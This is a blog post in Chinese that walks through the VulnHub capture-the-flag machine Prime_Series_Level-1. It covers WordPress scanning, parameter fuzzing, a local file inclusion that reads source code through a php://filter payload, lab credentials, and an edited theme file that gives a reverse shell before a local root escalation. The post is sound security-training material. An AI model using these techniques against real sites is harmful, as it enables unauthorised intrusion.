---
layout: post
title:  "vulnhub >_ Prime_Series_Level-1"
description: walkthrough
category: vulnhub
---
# Prime_Series_Level-1



![image-20200616032702410]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616032702410.png)



![image-20200616034329320]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616034329320.png)



![image-20200616034518382]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616034518382.png)

wpscan正常扫识别不了，--force强制扫描

```bash
wpscan --url http://192.168.43.67/wordpress/ -e ap,vt,cb,u --force
```

![image-20200616035034608]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616035034608.png)

网页刷不出来。改了一下nat。正常了

但是没找到什么

重新换工具打目录



![image-20200616213145926]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616213145926.png)

![image-20200616213041045]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616213041045.png)

![image-20200616215441336]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616215441336.png)

浏览这个页面并不存在。线索是提示wfuzz，尝试在之前打过的php页面fuzz参数。

![image-20200616212916122]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616212916122.png)

```bash
http://10.10.10.129/index.php?file=location.txt
```



![image-20200616215704601]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616215704601.png)

另一个php页面是之前扫到的image.php

```bash
http://10.10.10.129/image.php?secrettier360=
```

![image-20200616215900633]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616215900633.png)

我们需要搞懂这个页面能提供什么功能。尝试看一下源码

```bash
10.10.10.129/image.php?secrettier360=php://filter/read=convert.base64-encode/resource=image.php
```

![image-20200616220111837]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616220111837.png)

![image-20200616220257792]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616220257792.png)

显然可以文件包含

![image-20200616220614259]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616220614259.png)

验证成功，还有另外一个提示，尝试按提示读取

![image-20200616220710770]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616220710770.png)



现在我们有了一个用户凭证

```bash
saket:follow_the_ippsec
```

先实验ssh

![image-20200616221115742]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616221115742.png)

想到之前扫出的wordpress登录页面

```bash
http://10.10.10.129/wordpress/wp-admin
```

尝试登录失败。

查看wp的页面

![image-20200616222403987]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616222403987.png)

发现实际wp管理员的用户名可能是victor

```bash
victor:follow_the_ippsec
```



![image-20200616222625497]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616222625497.png)



修改主题已获得rshell

![image-20200616224111591]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616224111591.png)

在右侧逐个查看页面查找可以修改的页面

![image-20200616224219617]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616224219617.png)

修改成rshell

![image-20200616224310635]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616224310635.png)

```bash
http://10.10.10.129/wordpress/wp-content/themes/twentynineteen/secret.php
```

![image-20200616224525255]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616224525255.png)

![image-20200616225603258]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616225603258.png)

直接本地提权

![image-20200616225900539]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616225900539.png)

![image-20200616225839008]({{ site.url }}/assets/Prime_Series_Level-1.assets/image-20200616225839008.png)